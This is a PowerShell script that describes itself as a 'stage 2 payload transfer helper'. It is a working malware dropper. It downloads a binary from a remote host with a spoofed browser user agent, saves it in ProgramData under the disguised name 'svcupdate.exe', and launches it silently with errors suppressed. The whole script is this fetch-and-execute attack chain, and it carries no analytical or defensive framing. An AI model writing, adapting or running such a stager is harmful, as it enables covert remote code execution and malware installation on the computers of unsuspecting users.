
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
$FetchUrl = 'https://adatum.com/stage2.bin'
$WorkingPath = "C:\ProgramData\svcupdate.exe"
$ConnectionTimeout = 156
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $OperationResult = Get-Stage2Payload -SourceUrl $FetchUrl -DestinationPath $WorkingPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
    if ($OperationResult) {
        Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Write-Output "stage 21 initialized"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
